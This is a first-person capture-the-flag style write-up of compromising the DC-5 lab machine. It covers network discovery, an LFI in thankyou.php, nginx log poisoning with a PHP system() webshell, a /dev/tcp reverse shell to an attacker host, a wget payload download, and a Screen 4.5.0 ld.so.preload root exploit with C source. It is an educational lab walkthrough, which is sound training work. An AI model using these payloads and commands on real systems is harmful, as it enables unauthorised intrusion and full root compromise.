# 3. Phase 1 — Network Discovery

The first question in a penetration test is:

> "Which machine is the target?"

I started with:

```bash
sudo netdiscover
```

## What `netdiscover` does

A local network can be thought of like a street full of houses.

I know I am on the street, but I need to know:

- which houses exist
- which IP addresses they use
- which MAC addresses belong to which machines

`netdiscover` performs local network discovery, primarily using ARP.

The output allowed me to identify the DC-5 VM.

### Lesson

Do not start blindly attacking an unknown address.

The normal flow is:

```text
Discover
   ↓
Identify target
   ↓
Enumerate target
```

After finding the target IP, I checked connectivity:

```bash
ping -c 1 <DC5_IP>
```

A reply confirmed the target was reachable.

### Simple explanation

`ping` is basically:

> "Are you there?"

A response means the machine answered at the network level.

# 5. Phase 2 — Nmap

Next I needed to know what the target was exposing.

I ran:

```bash
nmap -A -sV <DC5_IP>
```

## `-sV`

This attempts service/version detection.

Without version detection I might only see:

```text
80/tcp open
```

With `-sV`, I got useful information such as:

```text
80/tcp open http nginx 1.6.2
```

## `-A`

`-A` enables several advanced detection features, including OS detection, version detection, scripts and traceroute.

# 11. Phase 4 — Local File Inclusion

I tested the `file` parameter with a known Linux file:

```text
/etc/passwd
```

Conceptually:

```bash
curl -s "http://<DC5_IP>/thankyou.php?file=/etc/passwd"
```

The application returned the contents of `/etc/passwd`.

This confirmed **Local File Inclusion (LFI)**.

---

# 12. What LFI Means

Imagine a PHP application contains something conceptually similar to:

```php
include($_GET['file']);
```

The developer may intend the user to request:

```text
file=some_template.php
```

But if the application does not restrict the value, an attacker can request:

```text
file=/etc/passwd
```

The server then attempts to include that file.

### The important lesson

The application trusted something that should have been controlled.

That turned a normal-looking parameter into a file-reading primitive.

# 15. Attempting to Read `thankyou.php`

I tried to use LFI to read:

```text
/var/www/html/thankyou.php
```

However, the file was PHP code.

Because the application was using PHP `include()`, the file was interpreted instead of simply being returned as source code.

### Lesson

This is an important difference:

```text

```

```text
Read PHP source
```

If PHP is included normally, PHP executes.

That meant I needed another source of information.

# 17. The Big Idea: Log Poisoning

At this point I had:

```text
LFI
+
A readable server log
```

That suggested **log poisoning**.

The basic idea is:

```text
Attacker-controlled input
        |
        v
Written into a log
        |
        v
LFI includes the log
        |
        v
PHP interprets attacker-controlled PHP
        |
        v
Command execution
```

This is a classic example of combining two weaknesses.

Neither weakness had to be the entire attack by itself.

---

# 18. The User-Agent Attempts

One of the techniques we investigated was putting PHP code into HTTP request headers such as the User-Agent.

The theoretical chain was:

```text
HTTP request
    |
    v
Malicious User-Agent
    |
    v
Nginx writes it into a log
    |
    v
LFI includes the log
    |
    v
PHP interprets the payload
```

However, this did not behave cleanly on this DC-5 environment.

The payload was being stripped/truncated.

## This became our first major loop

We spent too much time trying variations of the same basic idea.

### What we learned

When the payload does not survive the delivery mechanism, repeatedly changing tiny parts of the same payload may not solve the real problem.

I eventually changed the method of sending the request.

# 19. Burp Suite Breakthrough

I used Burp Suite to reproduce the request.

The important payload was conceptually:

```php
<?php system($_GET['c']); ?>
```

and it was supplied through the vulnerable `file` parameter so that it could reach the log.

Burp handled the required URL encoding of characters such as:

```text
<
>
?
'
;
```

This was the breakthrough.

# 20. Confirming PHP Code Execution

When I included the poisoned Nginx error log again, the error log contained a message similar to:

```text
PHP Warning: system(): Cannot execute a blank command
```

That message was extremely important.

It proved that the PHP code was actually being interpreted.

The chain was now:

```text
Poison log
    ↓
LFI reads log
    ↓
PHP interprets injected PHP
    ↓
system() executes
```

At this point I had **Remote Code Execution (RCE)**.

# 21. RCE vs Running a Command

This distinction was important during the lab.

The payload:

```php
<?php system($_GET['c']); ?>
```

created the ability to execute commands.

Then I used:

```text
&c=id
```

to supply the command.

So:

```text
RCE
```

is the capability, while:

```text
id
```

is the command used to prove the capability.

The `id` parameter did not create RCE.

It demonstrated that RCE already existed.

# 24. Reverse Shell Testing

Running everything through HTTP was inconvenient.

An interactive shell would be much easier.

On Kali I started:

```bash
nc -lvnp 4444
```

Then I used the RCE on DC-5 to test whether it could connect back.

A simple connectivity test was:

```bash
/bin/bash -c 'echo test > /dev/tcp/<KALI_IP>/4444'
```

The listener received:

```text

```

This proved the network path was working.

---

# 25. Why the First Full Reverse Shell Was Difficult

The simple connection worked, but an initial full interactive Bash command did not immediately produce a shell.

This showed that:

```text
Network connectivity
```

was not the problem.

The problem was shell redirection / quoting / how the command was being passed through PHP `system()` and the HTTP request.

### Better approach

Use explicit file descriptor handling:

```bash
exec 5<>/dev/tcp/<KALI_IP>/4444
/bin/bash -i <&5 >&5 2>&5
```

This eventually produced a proper interactive shell.

# 31. Understanding the Screen Vulnerability

The exploit abuses the interaction between:

```text
SUID Screen
```

and:

```text
/etc/ld.so.preload
```

The basic idea:

1. Get Screen to create/overwrite `/etc/ld.so.preload`.
2. Put an attacker-controlled shared library path into it.
3. Cause a privileged process to load that library.
4. The library constructor runs with elevated privileges.
5. The constructor changes ownership/permissions of a helper binary.
6. The helper becomes SUID root.

This is why `ld.so.preload` was so important.

---

# 32. The `libhax.c` Library

The core library was based on the classic Screen exploit technique.

The constructor contained:

```c
__attribute__((constructor))
void dropshell(void)
{
    chown("/tmp/rootshell", 0, 0);
    chmod("/tmp/rootshell", 04755);
    unlink("/etc/ld.so.preload");
}
```

The important parts were:

### `chown`

```c
chown("/tmp/rootshell", 0, 0);
```

means:

```text
owner = root
group = root
```

### `chmod`

```c
chmod("/tmp/rootshell", 04755);
```

means:

```text
SUID + normal executable permissions
```

### `unlink`

```c
unlink("/etc/ld.so.preload");
```

removes the preload file after the payload has executed, helping prevent repeated unwanted loading.

---

# 33. Why a Constructor Was Used

The function had:

```c
__attribute__((constructor))
```

This tells the compiler:

> "Run this function automatically when the shared library is loaded."

So I did not have to manually call:

```text
dropshell()
```

The dynamic loader did it automatically.

---

# 34. Compiling `libhax.so`

On Kali:

```bash
mkdir -p ~/dc5-screen-exploit
cd ~/dc5-screen-exploit
```

The library was compiled with:

```bash
gcc -fPIC -shared -o libhax.so libhax.c
```

`-fPIC` creates position-independent code suitable for a shared library.

`-shared` tells GCC to create a shared object rather than a normal executable.

---

# 35. Creating the First `rootshell`

We created:

```c
#include <stdio.h>
#include <unistd.h>

int main(void)
{
    setuid(0);
    setgid(0);
    execl("/bin/bash", "bash", "-p", NULL);
    return 0;
}
```

and compiled it:

```bash
gcc -o rootshell rootshell.c
```

Then hosted it on Kali using:

```bash
python3 -m http.server 8000
```

The target downloaded it:

```bash
wget http://<KALI_IP>:8000/rootshell -O /tmp/rootshell
```

---

# 36. Triggering the Screen Exploit

The classic trigger used:

```bash
cd /etc
umask 000
/bin/screen-4.5.0 -D -m -L ld.so.preload echo -ne "\x0a/tmp/libhax.so"
```

The intention was to create:

```text
/etc/ld.so.preload
```

containing the library path.

Then the privileged Screen process caused the library constructor to execute.


# 39. The Major Binary Compatibility Problem

When I finally ran:

```bash
/tmp/rootshell
```

it failed with:

```text
GLIBC_2.34 not found
```

This was a very important debugging moment.

The SUID permissions were correct.

The exploit was correct.

The binary itself was the problem.

## Why?

The binary had been compiled on modern Kali.

DC-5 is an old Linux system.

Therefore:

```text
Kali binary
      |
      v
expects newer glibc
      |
      v
DC-5 has older glibc
      |
      v
execution fails
```

---


```text
/usr/bin/gcc
```

# 41. Investigating `cc1`

Instead of guessing, I asked GCC where it expected `cc1`:

```bash
gcc -print-prog-name=cc1
```

It returned:

```text
cc1
```

Then I searched:

```bash
find /usr -name cc1 -type f 2>/dev/null
```

This found:

```text
/usr/lib/gcc/x86_64-linux-gnu/4.9/cc1
```

So the compiler component existed.

---

# 42. Trying `GCC_EXEC_PREFIX`

I attempted:

```bash
GCC_EXEC_PREFIX=/usr/lib/gcc/x86_64-linux-gnu/4.9/ gcc -o /tmp/rootshell /tmp/rootshell.c
```

That got further but then failed:

```text

```

This showed the DC-5 GCC installation was incomplete or unable to locate its standard headers.

### Lesson

A command called `gcc` existing on the machine does not guarantee a complete build environment.

# 43. Alternative Library Experiment

Because the Kali-built helper had the wrong glibc, we experimented with a second library designed to modify the native DC-5 `/bin/bash`.

Conceptually it used:

```c
chown("/bin/bash", 0, 0);
chmod("/bin/bash", 04755);
```

The library itself compiled successfully on Kali.

It was transferred to DC-5.

However, the preload file showed an extra carriage return:

```text
^M
```

and `/bin/bash` remained:

```text
-rwxr-xr-x
```

So that experiment was not the successful route.

---

# 44. The `^M` Debugging Loop

We inspected:

```bash
cat -A /etc/ld.so.preload
```

and saw:

```text
^M$
/tmp/libhax-rootbash.so
```

`^M` represents carriage return (`\r`).

We tried terminal-output settings such as:

```bash
stty -onlcr
```

and:

```bash
stty -opost
```

but the artifact persisted.

### Lesson

When working with low-level payloads, the exact bytes matter.

A file can look visually correct while containing an extra control character.

---

# 45. Why We Could Not Simply Delete `/etc/ld.so.preload`

We tried:

```bash
rm -f /etc/ld.so.preload
```

but got:

```text
Permission denied
```

The file permissions were:

```text
-rw-rw-rw- 1 root www-data ...
```

It was writable but not removable by `www-data`.

### Linux lesson

Deleting a file depends on permissions of its parent directory.

The file's write permission alone does not grant permission to remove it.

The important observation was:

DC-5 already has its own:

```text

```

This binary is compiled for the target's old environment, so it does not have the Kali glibc mismatch.

# 48. Final Privilege Escalation

From the interactive `www-data` shell I ran:

```bash
/bin/bash -p
```

Then:

```bash
id
```

The result was:

```text
uid=33(www-data) gid=33(www-data) euid=0(root) groups=33(www-data)
```

Then:

```bash
whoami
```

returned:

```text
root
```

## Why this is important

The important field was:

```text
euid=0(root)
```

The original UID was still:

```text
uid=33(www-data)
```

but the **effective UID** was root.

This is exactly what we needed for privileged file access.

---

# 49. What `/bin/bash -p` Means

The `-p` option tells Bash to preserve privileged mode rather than dropping the elevated effective identity.

Without understanding this, it would be easy to see:

```text
uid=33(www-data)
```

and think the exploit failed.

But the decisive value was:

```text
euid=0
```

and:

```text
whoami
root
```

confirmed the result.

# 52. Mistakes and What I Learned From Each One

## Mistake 1 — Staying too long on User-Agent poisoning

### Problem

Payloads were not reaching the log cleanly.

### Better decision

Switch delivery method and use Burp to control the HTTP request/encoding.

### Lesson

When a payload is being modified, change the transport rather than endlessly tweaking the payload.

---

## Mistake 2 — Trying to read PHP source with LFI

### Problem

PHP was executed instead of displayed.

### Better decision

Use LFI against configuration files and logs.

### Lesson

Understand the behavior of the vulnerable primitive, not just its name.

---

## Mistake 3 — Treating HTTP RCE like a terminal

### Problem

Interactive programs such as Bash do not behave nicely through a normal HTTP response.

### Better decision

Create an interactive reverse shell.

### Lesson

Separate:

```text
RCE
```

from:

```text
interactive shell
```

They are different stages.

---

## Mistake 4 — Compiling the helper on Kali

### Problem

The binary required:

```text
GLIBC_2.34
```

which DC-5 did not have.

### Lesson

Old targets and modern attacker systems can have incompatible libraries.

---

## Mistake 5 — Trying to repair the incomplete target GCC

### Problem

`gcc` existed but its compiler components/headers were incomplete.

### Lesson

Do not assume a command's existence means its entire toolchain works.

---

## Mistake 6 — Experimenting with `/bin/bash` too early

### Problem

The alternative preload library produced a carriage-return issue and did not change Bash permissions.

### Lesson

When a known-good exploit path already works, preserve it and debug one variable at a time.

---

## Mistake 7 — Trying to delete `/etc/ld.so.preload`

### Problem

`www-data` could write it but could not remove it from `/etc`.

### Lesson

Understand parent-directory permissions.

---

## Mistake 8 — Rebooting

### Problem

Temporary files disappeared.

### Recovery

Restart the HTTP server and retransmit the exploit files.

### Lesson

Know which parts of an attack chain are persistent and which are stored in `/tmp`.

# 55. Important Linux Concepts Learned

## UID

The real user identity.

Example:

```text
uid=33(www-data)
```

## EUID

The effective identity used for many permission checks.

Example:

```text
euid=0(root)
```

## GID

Primary group ID.

## SUID

A special executable permission that causes a program to run with the owner's effective privileges.

Example:

```text
-rwsr-xr-x
```

## `root:root`

Means:

```text
owner = root
group = root
```

## `/etc/ld.so.preload`

A dynamic-loader configuration file that can cause a shared library to be loaded into processes.

In a privileged-process context, abusing this can have severe consequences.
